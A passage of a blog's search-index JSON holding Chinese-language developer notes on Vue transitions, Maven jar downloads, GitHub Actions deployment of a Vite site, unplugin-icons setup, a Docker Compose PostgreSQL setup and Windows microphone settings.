","date":"2021-10-09","objectID":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/:1:0","tags":["vue"],"title":"Vue 動畫過渡(Transition) 筆記","uri":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"Transition / Animation 釐清差異 可參考 Day27：小事之 Transition 與 Animation - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2021-10-09","objectID":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/:2:0","tags":["vue"],"title":"Vue 動畫過渡(Transition) 筆記","uri":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"Vue 的規範 Enter 畫面顯示(如 v-if 出來) xxx-enter-from, xxx-enter-active xxx-enter-active xxx-enter-to, xxx-enter-active no(Vue-transition) class Leave 畫面移除(如 v-if 移除) xxx-leave-from, xxx-leave-active xxx-leave-active xxx-leave-to, xxx-leave-active no(Vue-transition) class ","date":"2021-10-09","objectID":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/:3:0","tags":["vue"],"title":"Vue 動畫過渡(Transition) 筆記","uri":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"xxx怎麼命名 透過html \u003ctransition name=\"bounce\"\u003e bounce-leave-from bounce-leave-active bounce-leave-to bounce-leave-active ","date":"2021-10-09","objectID":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/:3:1","tags":["vue"],"title":"Vue 動畫過渡(Transition) 筆記","uri":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"一般使用 ","date":"2021-10-09","objectID":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/:4:0","tags":["vue"],"title":"Vue 動畫過渡(Transition) 筆記","uri":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"搭配 Vue 過渡 (Enter/Leave \u0026 List Transitions) \u003ctransition name=\"bounce\"\u003e \u003cp v-if=\"show\"\u003e Lorem ipsum dolor sit amet, consectetur adipiscing elit. Mauris facilisis enim libero, at lacinia diam fermentum id. Pellentesque habitant morbi tristique senectus et netus. \u003c/p\u003e \u003c/transition\u003e .bounce-enter-active { animation: bounce-in 0.5s; } .bounce-leave-active { animation: bounce-in 0.5s reverse; } @keyframes bounce-in { 0% { transform: scale(0); } 50% { transform: scale(1.25); } 100% { transform: scale(1); } } 小記重點 \u003ctransition\u003e的 name(xxx) 設定 xxx-leave-from, xxx-leave-active, xxx-enter-to 過渡屬性 ","date":"2021-10-09","objectID":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/:5:0","tags":["vue"],"title":"Vue 動畫過渡(Transition) 筆記","uri":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"搭配 Vue 過渡 (Enter/Leave \u0026 List Transitions) class enter-from-class enter-active-class enter-to-class leave-from-class leave-active-class leave-to-class ","date":"2021-10-09","objectID":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/:6:0","tags":["vue"],"title":"Vue 動畫過渡(Transition) 筆記","uri":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"使用 animate class \u003clink href=\"https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.0/animate.min.css\" rel=\"stylesheet\" type=\"text/css\" /\u003e \u003cdiv id=\"demo\"\u003e \u003cbutton @click=\"show = !show\"\u003e Toggle render \u003c/button\u003e \u003ctransition name=\"custom-classes-transition\" enter-active-class=\"animate__animated animate__tada\" leave-active-class=\"animate__animated animate__bounceOutRight\" \u003e \u003cp v-if=\"show\"\u003ehello\u003c/p\u003e \u003c/transition\u003e \u003c/div\u003e 簡單重點，不需考慮 form/to 概念`。 name=“custom-classes-transition” enter-active-class=“animate__animated animate__tada” leave-active-class=“animate__animated animate__bounceOutRight” ","date":"2021-10-09","objectID":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/:6:1","tags":["vue"],"title":"Vue 動畫過渡(Transition) 筆記","uri":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"回憶第一步驟 name 做甚麼? 對於這些在過渡中切換的類名來說，如果你使用一個沒有名字的 \u003ctransition\u003e，則 v- 是這些class名的默認前綴。如果你使用了 \u003ctransition name=\"my-transition\"\u003e，那麼 v-enter-from會替換為 my-transition-enter-from。 上面xxx怎麼命名有提到，感覺很容易忘記是這樣命名。 ","date":"2021-10-09","objectID":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/:6:2","tags":["vue"],"title":"Vue 動畫過渡(Transition) 筆記","uri":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"搭配 Animate.css 可以看【Day 26】CSS Animation - CSS 動畫資源蒐集與使用教學 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2021-10-09","objectID":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/:7:0","tags":["vue"],"title":"Vue 動畫過渡(Transition) 筆記","uri":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"官網建議 不要使用 root Element (html,body) 不要使用大的 Element 做動畫 (Bad UX) 不要使用無限動畫(分心使用者注意力) Mind the initial and final state of your elements(animation-fill-mode) 不能用在inline(要使用 inline-block) ","date":"2021-10-09","objectID":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/:7:1","tags":["vue"],"title":"Vue 動畫過渡(Transition) 筆記","uri":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"滾動到畫面觸發動畫 How to trigger a CSS animation on scroll IntersectionObserver const observer = new IntersectionObserver(entries =\u003e { // Loop over the entries entries.forEach(entry =\u003e { // If the element is visible if (entry.isIntersecting) { // Add the animation class entry.target.classList.add('square-animation'); } }); }); observer.observe(document.querySelector('.square')); 這邊題外話，之前有看過 Observer，這邊也有看到vue-chat-scroll和MutationObserver小記 | 程式狂想筆記，雖然兩者沒關係，可以看更多 Observer 在Web APIs | MDN搜尋 Observer`。 ","date":"2021-10-09","objectID":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/:7:2","tags":["vue"],"title":"Vue 動畫過渡(Transition) 筆記","uri":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"彩蛋 我猜我應該沒有空整理這個，先貼上來吧。 認識 Intersection Observer API：實作 Lazy Loading 和 Infinite Scroll | by Mike Huang | 麥克的半路出家筆記 | Medium 沒想到 lazy load 圖片，還能做到 Infinite Scroll 。這麼強大。 WeakMap and WeakSet（弱映射和弱集合） ","date":"2021-10-09","objectID":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/:7:3","tags":["vue"],"title":"Vue 動畫過渡(Transition) 筆記","uri":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/"},{"categories":["Java"],"content":"之前就有簡單小記springframework3 with struts2 使用 swagger 工具注解使用 | 程式狂想筆記 ","date":"2021-10-09","objectID":"/blog/posts/Maven-%E4%B8%8B%E8%BC%89-Jar-%E6%96%B9%E6%B3%95/:0:0","tags":["java","maven","jar"],"title":"Maven 下載 Jar 方法","uri":"/blog/posts/Maven-%E4%B8%8B%E8%BC%89-Jar-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"安裝 建置資料夾，新增 pom.xml Maven設定檔。 \u003cproject xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd\"\u003e \u003cmodelVersion\u003e4.0.0\u003c/modelVersion\u003e \u003cgroupId\u003ecom.yiibai.core\u003c/groupId\u003e \u003cartifactId\u003eProjectName\u003c/artifactId\u003e \u003cpackaging\u003ejar\u003c/packaging\u003e \u003cversion\u003e1.0-SNAPSHOT\u003c/version\u003e \u003cname\u003eProjectName\u003c/name\u003e \u003curl\u003ehttp://maven.apache.org\u003c/url\u003e \u003cdependencies\u003e \u003c!-- https://mvnrepository.com/artifact/org.docx4j/docx4j --\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.docx4j\u003c/groupId\u003e \u003cartifactId\u003edocx4j\u003c/artifactId\u003e \u003cversion\u003e3.2.2\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e \u003c/project\u003e 下這個指令。 mvn dependency:copy-dependencies 就可以下載。 ","date":"2021-10-09","objectID":"/blog/posts/Maven-%E4%B8%8B%E8%BC%89-Jar-%E6%96%B9%E6%B3%95/:1:0","tags":["java","maven","jar"],"title":"Maven 下載 Jar 方法","uri":"/blog/posts/Maven-%E4%B8%8B%E8%BC%89-Jar-%E6%96%B9%E6%B3%95/"},{"categories":["Vite"],"content":"最近研究如何發布或定期執行程式，所以就找了一下並整理。 ","date":"2021-10-09","objectID":"/blog/posts/Vite-%E9%83%A8%E5%B1%AC%E5%88%B0-Github-Actions-%E5%B0%8F%E8%A8%98/:0:0","tags":["vite","github","actions","deploy"],"title":"Vite 部屬到 Github Actions 小記","uri":"/blog/posts/Vite-%E9%83%A8%E5%B1%AC%E5%88%B0-Github-Actions-%E5%B0%8F%E8%A8%98/"},{"categories":["Vite"],"content":"免費限制 作业执行时间 - 工作流程中的每个作业最多可以运行 6 个小时。 如果作业达到此限制，该作业将会终止而无法完成。 工作流程运行时间 - 每个工作流程的运行时限为 72 小时。 如果工作流程运行时间达到此限制，其运行将被取消。 ","date":"2021-10-09","objectID":"/blog/posts/Vite-%E9%83%A8%E5%B1%AC%E5%88%B0-Github-Actions-%E5%B0%8F%E8%A8%98/:1:0","tags":["vite","github","actions","deploy"],"title":"Vite 部屬到 Github Actions 小記","uri":"/blog/posts/Vite-%E9%83%A8%E5%B1%AC%E5%88%B0-Github-Actions-%E5%B0%8F%E8%A8%98/"},{"categories":["Vite"],"content":"教學 參考: https://tzuhui.github.io/2020/12/11/Vue/Vue-deploy-github-actions/ https://milkmidi.medium.com/%E6%B7%B1%E5%85%A5%E4%BD%86%E4%B8%8D%E6%B7%BA%E5%87%BA-%E5%A6%82%E4%BD%95%E7%94%A8-github-actions-%E8%87%AA%E5%8B%95%E7%99%BC%E4%BD%88-gh-pages-8183464dfe84 ","date":"2021-10-09","objectID":"/blog/posts/Vite-%E9%83%A8%E5%B1%AC%E5%88%B0-Github-Actions-%E5%B0%8F%E8%A8%98/:2:0","tags":["vite","github","actions","deploy"],"title":"Vite 部屬到 Github Actions 小記","uri":"/blog/posts/Vite-%E9%83%A8%E5%B1%AC%E5%88%B0-Github-Actions-%E5%B0%8F%E8%A8%98/"},{"categories":["Vite"],"content":"設定 Github Token 給 Github Actions 用 專案設定 勾選圖片選項 此token 產生之後無法看到，記得先存起來。 ","date":"2021-10-09","objectID":"/blog/posts/Vite-%E9%83%A8%E5%B1%AC%E5%88%B0-Github-Actions-%E5%B0%8F%E8%A8%98/:2:1","tags":["vite","github","actions","deploy"],"title":"Vite 部屬到 Github Actions 小記","uri":"/blog/posts/Vite-%E9%83%A8%E5%B1%AC%E5%88%B0-Github-Actions-%E5%B0%8F%E8%A8%98/"},{"categories":["Vite"],"content":"設定 secret 設定完無法再看到之前設定值，滿特別的東西。 ","date":"2021-10-09","objectID":"/blog/posts/Vite-%E9%83%A8%E5%B1%AC%E5%88%B0-Github-Actions-%E5%B0%8F%E8%A8%98/:2:2","tags":["vite","github","actions","deploy"],"title":"Vite 部屬到 Github Actions 小記","uri":"/blog/posts/Vite-%E9%83%A8%E5%B1%AC%E5%88%B0-Github-Actions-%E5%B0%8F%E8%A8%98/"},{"categories":["Vite"],"content":"前湍 Vite 設定 調整 vite.confing.js base: ‘/vite-test-publish-githubpage/’, ","date":"2021-10-09","objectID":"/blog/posts/Vite-%E9%83%A8%E5%B1%AC%E5%88%B0-Github-Actions-%E5%B0%8F%E8%A8%98/:2:3","tags":["vite","github","actions","deploy"],"title":"Vite 部屬到 Github Actions 小記","uri":"/blog/posts/Vite-%E9%83%A8%E5%B1%AC%E5%88%B0-Github-Actions-%E5%B0%8F%E8%A8%98/"},{"categories":["Vite"],"content":"專案目錄需要設定 .github/workflows/main.yml # This is a basic workflow to help you get started with Actions name: deploy # Controls when the action will run. on: # Triggers the workflow on push or pull request events but only for the main branch push: branches: - master pull_request: branches: - master schedule: # * is a special character in YAML so you have to quote this string - cron: '0,15,30,45 12,13 * * *' # Allows you to run this workflow manually from the Actions tab workflow_dispatch: # A workflow run is made up of one or more jobs that can run sequentially or in parallel jobs: # This workflow contains a single job called \"build\" build: # The type of runner that the job will run on runs-on: ubuntu-latest # Steps represent a sequence of tasks that will be executed as part of the job steps: # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it - uses: actions/checkout@v2 - name: Install \u0026 Build # 執行指令 run: | npm install npm run build # Runs a single command using the runners shell - name: Deploy uses: JamesIves/github-pages-deploy-action@4.1.4 with: # ACCESS_TOKEN: ${{ secrets.ACCESS_TOKEN }} # Settings \u003e Secret 建立的 ACCESS_TOKEN，推同個 repo 的話可以不需要 branch: gh-pages # deploy 到 gh-pages 這個分支 folder: dist # build 後的資料夾 有看到文章說.github/workflows/會執行當下目錄下 yaml 檔案。 ","date":"2021-10-09","objectID":"/blog/posts/Vite-%E9%83%A8%E5%B1%AC%E5%88%B0-Github-Actions-%E5%B0%8F%E8%A8%98/:2:4","tags":["vite","github","actions","deploy"],"title":"Vite 部屬到 Github Actions 小記","uri":"/blog/posts/Vite-%E9%83%A8%E5%B1%AC%E5%88%B0-Github-Actions-%E5%B0%8F%E8%A8%98/"},{"categories":["Vite"],"content":"排程設定 # Controls when the action will run. on: # Triggers the workflow on push or pull request events but only for the main branch push: branches: - master pull_request: branches: - master schedule: # * is a special character in YAML so you have to quote this string - cron: '0,15,30,45 12,13 * * *' https://skeptric.com/github-action-cron/ timezone 時區要注意，不是用台灣時間，UTC+0時間。排成也不會馬上啟動，好像大多數排隊消化其他人排成，後續才會輪到，甚至排到兩次可能會取消，請看下面例子。 例如:cron: '0,15,30,45 9 * * *'。 下面都是台灣時間 0 =\u003e 15 =\u003e 17:17 30 =\u003e 17:39 45 =\u003e 17:51 這邊看到 0分時候沒有啟動，原因是 Github Actions 還沒排到，所以15分又啟動排成就不會執行。 ","date":"2021-10-09","objectID":"/blog/posts/Vite-%E9%83%A8%E5%B1%AC%E5%88%B0-Github-Actions-%E5%B0%8F%E8%A8%98/:3:0","tags":["vite","github","actions","deploy"],"title":"Vite 部屬到 Github Actions 小記","uri":"/blog/posts/Vite-%E9%83%A8%E5%B1%AC%E5%88%B0-Github-Actions-%E5%B0%8F%E8%A8%98/"},{"categories":["Vite"],"content":"actions-status-discord 通知 - uses: sarisia/actions-status-discord@v1 if: always() with: webhook: ${{ secrets.DISCORD_WEBHOOK }} title: \"deploy\" description: \"Build and deploy to GitHub Pages\" username: GitHub Actions ","date":"2021-10-09","objectID":"/blog/posts/Vite-%E9%83%A8%E5%B1%AC%E5%88%B0-Github-Actions-%E5%B0%8F%E8%A8%98/:4:0","tags":["vite","github","actions","deploy"],"title":"Vite 部屬到 Github Actions 小記","uri":"/blog/posts/Vite-%E9%83%A8%E5%B1%AC%E5%88%B0-Github-Actions-%E5%B0%8F%E8%A8%98/"},{"categories":["Vite"],"content":"相關教學文章 https://github.com/JamesIves/github-pages-deploy-action 史上最齊全最詳細的Drone自動化教學文件 - HackMD actions/starter-workflows: Accelerating new GitHub Actions workflows https://docs.github.com/cn/actions/reference/events-that-trigger-workflows https://medium.com/starbugs/%E5%AF%A6%E4%BD%9C%E9%96%8B%E6%BA%90%E5%B0%8F%E5%B7%A5%E5%85%B7-%E8%88%87-github-actions-%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E7%9B%B8%E9%81%87-3dd2d70eeb 使用drone和gogs搭建自己的CI/CD系统 - SegmentFault 思否 CICD With DroneCI and Gitea Using Docker Compose - Ruan Bekker’s Blog ","date":"2021-10-09","objectID":"/blog/posts/Vite-%E9%83%A8%E5%B1%AC%E5%88%B0-Github-Actions-%E5%B0%8F%E8%A8%98/:5:0","tags":["vite","github","actions","deploy"],"title":"Vite 部屬到 Github Actions 小記","uri":"/blog/posts/Vite-%E9%83%A8%E5%B1%AC%E5%88%B0-Github-Actions-%E5%B0%8F%E8%A8%98/"},{"categories":["Vite"],"content":"Raspberry PI 架 Drone How to set up Drone CI on Raspberry Pi (and why you shouldn’t) | Alex Hyett ","date":"2021-10-09","objectID":"/blog/posts/Vite-%E9%83%A8%E5%B1%AC%E5%88%B0-Github-Actions-%E5%B0%8F%E8%A8%98/:6:0","tags":["vite","github","actions","deploy"],"title":"Vite 部屬到 Github Actions 小記","uri":"/blog/posts/Vite-%E9%83%A8%E5%B1%AC%E5%88%B0-Github-Actions-%E5%B0%8F%E8%A8%98/"},{"categories":["Vue"],"content":"今天正要使用 vite-plugin-icons 看看，發現套件名子改掉了，剛好我順便紀錄。 ","date":"2021-10-09","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-unplugin-icons-vite-plugin-icons-%E5%88%9D%E9%AB%94%E9%A9%97/:0:0","tags":["vite","unplugin-icon","iconify","vite-plugin-icons"],"title":"使用 unplugin-icons (vite-plugin-icons) 初體驗","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-unplugin-icons-vite-plugin-icons-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Vue"],"content":"安裝 npm i -D unplugin-icons @iconify/json ","date":"2021-10-09","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-unplugin-icons-vite-plugin-icons-%E5%88%9D%E9%AB%94%E9%A9%97/:1:0","tags":["vite","unplugin-icon","iconify","vite-plugin-icons"],"title":"使用 unplugin-icons (vite-plugin-icons) 初體驗","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-unplugin-icons-vite-plugin-icons-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Vue"],"content":"SyntaxError: Named export ‘SVG’ not found. The requested module ‘@iconify/json-tools’ is a CommonJS module, which may not support all module.exports as named exports. 好像某套件不支援 ES6 import 方法，所以造成的? \"type\": \"module\", 但我的專案執行某 js 需要支援這個，頭痛QQ。 後來有找到解法es6 modules - How can I use an ES6 import in Node.js? - Stack Overflow Node.js \u003e= v13 It's very simple in Node.js 13 and above. You need to either: Save the file with .mjs extension, or Add { \"type\": \"module\" } in the nearest package.json. You only need to do one of the above to be able to use ECMAScript modules. Node.js \u003c= v12 If you are using Node.js version 8-12, save the file with ES6 modules with .mjs extension and run it like: node --experimental-modules my-app.mjs 我改成 mjs，npm run xxx-js 就正常了。 ","date":"2021-10-09","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-unplugin-icons-vite-plugin-icons-%E5%88%9D%E9%AB%94%E9%A9%97/:1:1","tags":["vite","unplugin-icon","iconify","vite-plugin-icons"],"title":"使用 unplugin-icons (vite-plugin-icons) 初體驗","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-unplugin-icons-vite-plugin-icons-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Vue"],"content":"設定 vite // vite.config.ts import Icons from 'unplugin-icons/vite' export default defineConfig({ plugins: [ Icons({ /* options */ }), ], }) ","date":"2021-10-09","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-unplugin-icons-vite-plugin-icons-%E5%88%9D%E9%AB%94%E9%A9%97/:2:0","tags":["vite","unplugin-icon","iconify","vite-plugin-icons"],"title":"使用 unplugin-icons (vite-plugin-icons) 初體驗","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-unplugin-icons-vite-plugin-icons-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Vue"],"content":"設定 commponent \u003cscript setup\u003e import IconAccessibility from '~icons/carbon/accessibility' import IconAccountBox from '~icons/mdi/account-box' \u003c/script\u003e \u003ctemplate\u003e \u003cicon-accessibility/\u003e \u003cicon-account-box style=\"font-size: 2em; color: red\"/\u003e \u003c/template\u003e 這邊我花了一大段時間查他怎麼取出 Icon。 使用Icônes找出你要的圖 // icon-park-outline:setting-two import IconSetting from '~icons/icon-park-outline/setting-two' 很特別的是前面 import 的名稱可以自訂。 ","date":"2021-10-09","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-unplugin-icons-vite-plugin-icons-%E5%88%9D%E9%AB%94%E9%A9%97/:3:0","tags":["vite","unplugin-icon","iconify","vite-plugin-icons"],"title":"使用 unplugin-icons (vite-plugin-icons) 初體驗","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-unplugin-icons-vite-plugin-icons-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Docker"],"content":"docker hub 有範例，但我還是紀錄一下。 # Use postgres/example user/password credentials version: '3.1' services: db: image: postgres restart: always environment: POSTGRES_PASSWORD: example adminer: image: adminer restart: always ports: - 8080:8080 ","date":"2021-10-09","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-Docker-%E5%BB%BA%E7%BD%AE-PostgreSQL-%E8%B3%87%E6%96%99%E5%BA%AB/:0:0","tags":["docker","postgressql","deploy"],"title":"使用 Docker 建置 PostgreSQL 資料庫","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-Docker-%E5%BB%BA%E7%BD%AE-PostgreSQL-%E8%B3%87%E6%96%99%E5%BA%AB/"},{"categories":["Docker"],"content":"add host adminer: image: adminer restart: always ports: - 8080:8080 extra_hosts: - \"oracle:162.242.195.82\" - \"finvc:172.31.70.174\" https://github.com/compose-spec/compose-spec/blob/master/spec.md#extra_hosts ","date":"2021-10-09","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-Docker-%E5%BB%BA%E7%BD%AE-PostgreSQL-%E8%B3%87%E6%96%99%E5%BA%AB/:1:0","tags":["docker","postgressql","deploy"],"title":"使用 Docker 建置 PostgreSQL 資料庫","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-Docker-%E5%BB%BA%E7%BD%AE-PostgreSQL-%E8%B3%87%E6%96%99%E5%BA%AB/"},{"categories":["Windows"],"content":"正確控制 Window 麥克風 聲音裝置預設/預設通訊裝置 最近電腦輸入輸出都很不穩定，上次的經驗電腦使用藍芽耳機時候不能聽到電腦音樂(或其他聲音) | 程式狂想筆記遇到藍芽有兩個裝置，導致輸出音樂可能會造成聽不到聲音現象。 檢查 Windows 10 麥克風權限 驅動檢查/麥克風檢查 大多網路上都是說檢查這幾項，詳細可以更多檢查可以看Discord 視訊與語音故障排除指南 – Discord ","date":"2021-10-09","objectID":"/blog/posts/%E6%AD%A3%E7%A2%BA%E6%8E%A7%E5%88%B6-Window-%E9%BA%A5%E5%85%8B%E9%A2%A8-%E8%81%B2%E9%9F%B3%E8%A3%9D%E7%BD%AE%E9%A0%90%E8%A8%AD-%E9%A0%90%E8%A8%AD%E9%80%9A%E8%A8%8A%E8%A3%9D%E7%BD%AE/:0:0","tags":["window","麥克風","聲音","控制台"],"title":"正確控制 Window 麥克風 聲音裝置預設/預設通訊裝置","uri":"/blog/posts/%E6%AD%A3%E7%A2%BA%E6%8E%A7%E5%88%B6-Window-%E9%BA%A5%E5%85%8B%E9%A2%A8-%E8%81%B2%E9%9F%B3%E8%A3%9D%E7%BD%AE%E9%A0%90%E8%A8%AD-%E9%A0%90%E8%A8%AD%E9%80%9A%E8%A8%8A%E8%A3%9D%E7%BD%AE/"},{"categories":["Windows"],"content":"聲音裝置預設/預設通訊裝置 正常程式會有預設裝置 連接藍芽發現不是我正常要的預設裝置，雖然可以手動調整，但每次用也都很麻煩。 這邊分享我使用的方式，麥克風地方「預設裝置/預設通訊裝置」都設為同一個麥克風。但輸出預設不會用到通訊裝置，這一點也很奇怪… 輸出假如是用藍芽耳機的話，我目前是指定輸出到藍芽耳機。 我有看到TIL: Discord doesn’t use the default communications device : discordapp，這篇有提到Discord 預設裝置不是走通訊裝置，Line APP 也是這樣。目前應用程式大多數無法控制到預設通訊裝置，這邊可能需要注意。 ","date":"2021-10-09","objectID":"/blog/posts/%E6%AD%A3%E7%A2%BA%E6%8E%A7%E5%88%B6-Window-%E9%BA%A5%E5%85%8B%E9%A2%A8-%E8%81%B2%E9%9F%B3%E8%A3%9D%E7%BD%AE%E9%A0%90%E8%A8%AD-%E9%A0%90%E8%A8%AD%E9%80%9A%E8%A8%8A%E8%A3%9D%E7%BD%AE/:1:0","tags":["window","麥克風","聲音","控制台"],"title":"正確控制 Window 麥克風 聲音裝置預設/預設通訊裝置","uri":"/blog/posts/%E6%AD%A3%E7%A2%BA%E6%8E%A7%E5%88%B6-Window-%E9%BA%A5%E5%85%8B%E9%A2%A8-%E8%81%B2%E9%9F%B3%E8%A3%9D%E7%BD%AE%E9%A0%90%E8%A8%AD-%E9%A0%90%E8%A8%AD%E9%80%9A%E8%A8%8A%E8%A3%9D%E7%BD%AE/"},{"categories":["Windows"],"content":"麥克風聆聽輸出到裝置上 上面聆聽此裝置可以打勾，透過此裝置選擇要輸出的地方就可以聽到你麥克風講話的聲音。 ","date":"2021-10-09","objectID":"/blog/posts/%E6%AD%A3%E7%A2%BA%E6%8E%A7%E5%88%B6-Window-%E9%BA%A5%E5%85%8B%E9%A2%A8-%E8%81%B2%E9%9F%B3%E8%A3%9D%E7%BD%AE%E9%A0%90%E8%A8%AD-%E9%A0%90%E8%A8%AD%E9%80%9A%E8%A8%8A%E8%A3%9D%E7%BD%AE/:2:0","tags":["window","麥克風","聲音","控制台"],"title":"正確控制 Window 麥克風 聲音裝置預設/預設通訊裝置","uri":"/blog/posts/%E6%AD%A3%E7%A2%BA%E6%8E%A7%E5%88%B6-Window-%E9%BA%A5%E5%85%8B%E9%A2%A8-%E8%81%B2%E9%9F%B3%E8%A3%9D%E7%BD%AE%E9%A0%90%E8%A8%AD-%E9%A0%90%E8%A8%AD%E9%80%9A%E8%A8%8A%E8%A3%9D%E7%BD%AE/"},{"categories":["Windows"],"content":"線上測試麥克風 線上網路攝影機＆麥克風測試 - ToolsKK 後續有想到甚麼再補 ","date":"2021-10-09","objectID":"/blog/posts/%E6%AD%A3%E7%A2%BA%E6%8E%A7%E5%88%B6-Window-%E9%BA%A5%E5%85%8B%E9%A2%A8-%E8%81%B2%E9%9F%B3%E8%A3%9D%E7%BD%AE%E9%A0%90%E8%A8%AD-%E9%A0%90%E8%A8%AD%E9%80%9A%E8%A8%8A%E8%A3%9D%E7%BD%AE/:3:0","tags":["window","麥克風","聲音","控制台"],"title":"正確控制 Window 麥克風 聲音裝置預設/預設通訊裝置","uri":"/blog/posts/%E6%AD%A3%E7%A2%BA%E6%8E%A7%E5%88%B6-Window-%E9%BA%A5%E5%85%8B%E9%A2%A8-%E8%81%B2%E9%9F%B3%E8%A3%9D%E7%BD%AE%E9%A0%90%E8%A8%AD-%E9%A0%90%E8%A8%AD%E9%80%9A%E8%A8%8A%E8%A3%9D%E7%BD%AE/"},{"categories":["Windows"],"content":"其他 Realtek 立體聲混音/麥克風 差別 - Mobile01 Can’t Hear Anyone On Discord, Audio Not Working (FIXED) ","date":"2021-10-09","objectID":"/blog/posts/%E6%AD%A3%E7%A2%BA%E6%8E%A7%E5%88%B6-Window-%E9%BA%A5%E5%85%8B%E9%A2%A8-%E8%81%B2%E9%9F%B3%E8%A3%9D%E7%BD%AE%E9%A0%90%E8%A8%AD-%E9%A0%90%E8%A8%AD%E9%80%9A%E8%A8%8A%E8%A3%9D%E7%BD%AE/:4:0","tags":["window","麥克風","聲音","控制台"],"title":"正確控制 Window 麥克風 